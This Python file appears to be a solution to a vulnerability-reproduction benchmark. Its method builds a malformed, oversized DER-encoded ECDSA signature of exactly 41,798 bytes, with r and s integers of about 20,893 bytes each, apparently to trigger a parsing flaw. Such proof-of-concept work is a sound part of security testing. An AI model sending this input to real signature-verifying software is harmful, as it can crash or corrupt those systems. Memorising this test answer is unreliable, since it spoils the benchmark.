import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Target total PoC length: 41798 bytes
        # We will construct a DER-encoded ECDSA signature:
        # SEQUENCE {
        #   INTEGER r (very large)
        #   INTEGER s (very large)
        # }
        # with precise lengths to hit 41798 bytes total.
        target_total_length = 41798

        def der_len_bytes(n: int) -> bytes:
            if n < 0x80:
                return bytes([n])
            elif n <= 0xFF:
                return bytes([0x81, n])
            elif n <= 0xFFFF:
                return bytes([0x82]) + n.to_bytes(2, 'big')
            elif n <= 0xFFFFFF:
                return bytes([0x83]) + n.to_bytes(3, 'big')
            else:
                return bytes([0x84]) + n.to_bytes(4, 'big')

        def make_integer(length: int, fill_byte: int = 0x80) -> bytes:
            # Ensure positive integer with a leading zero byte; second byte 0x80 to require the leading 0x00
            if length < 1:
                length = 1
            if length == 1:
                value = b'\x00'
            else:
                value = b'\x00' + bytes([fill_byte]) * (length - 1)
            return b'\x02' + der_len_bytes(length) + value

        # Choose r_len and s_len so that total length matches target_total_length.
        # Total length formula:
        # total = 1 (SEQUENCE tag) + len(der_len(seq_len)) + seq_len
        # and seq_len = len(INT r) + len(INT s)
        # len(INT x) = 1 (tag) + len(der_len(x_len)) + x_len
        # For stability, use lengths where der_len uses 0x82 (i.e., > 255 and <= 65535).
        r_len = 20893
        s_len = 20893  # These values give the desired total size when both are > 255.

        int_r = make_integer(r_len, 0x80)
        int_s = make_integer(s_len, 0x80)
        seq_len = len(int_r) + len(int_s)
        seq = b'\x30' + der_len_bytes(seq_len) + int_r + int_s

        # If by some chance the sequence length didn't match the target total length (shouldn't happen),
        # adjust s_len accordingly while keeping DER structure consistent.
        if len(seq) != target_total_length:
            # Compute the fixed overhead outside s's value:
            # total = 1 + len(der_len(seq_len)) + (1 + len(der_len(r_len)) + r_len) + (1 + len(der_len(s_len)) + s_len)
            # This is tricky due to der_len sizes; perform a small search near expected s_len to adjust.
            base_r = make_integer(r_len, 0x80)
            # Try a small window around 20893 to reach exact target length.
            found = False
            for cand_s_len in range(20000, 22000):
                cand_s = make_integer(cand_s_len, 0x80)
                cand_seq_len = len(base_r) + len(cand_s)
                cand_seq = b'\x30' + der_len_bytes(cand_seq_len) + base_r + cand_s
                if len(cand_seq) == target_total_length:
                    seq = cand_seq
                    found = True
                    break
            if not found:
                # Fallback: just return the originally constructed sequence (should be correct already).
                pass

        return seq